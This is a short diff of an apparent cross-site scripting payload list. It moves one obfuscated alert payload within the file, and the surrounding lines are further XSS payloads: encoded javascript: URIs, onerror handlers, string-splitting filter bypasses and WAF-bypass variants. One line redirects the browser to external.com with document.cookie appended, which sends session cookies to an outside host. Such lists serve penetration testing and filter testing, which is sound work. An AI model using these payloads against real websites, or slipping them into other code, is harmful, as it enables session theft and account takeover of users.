@@ -131,7 +131,6 @@ javascript:%ef%bb%bfalert(XSS)
 &#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt;
 ‘ale’%2B‘rt’%2Blocation.hash.substr(1)>#(1)
 /ale/.source%2B/rt/.source%2Blocation.hash.substr(1)>#(1)
-"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
 <SCRIPT>location=%27javasCript:alert\x281\x29%27</SCRIPT>
 ';k='e'%0Atop['al'+k+'rt'](1)//
 "';k='e'%0Atop['al'+k+'rt'](1)//"
@@ -195,3 +194,4 @@ javascript%3Alocation%2f**%2f=%27https://external.com/?%27%2bdocument.cookie
 '<00 foo="<a%20href="javascript:alert('XSS-Bypass')">XSS-CLick</00>--%20/
 --'<00 foo="<a%20href="javascript:prompt(404)">XSS-Click</00>--%20//
 ">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(cloudfrontbypass)//'>
+"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
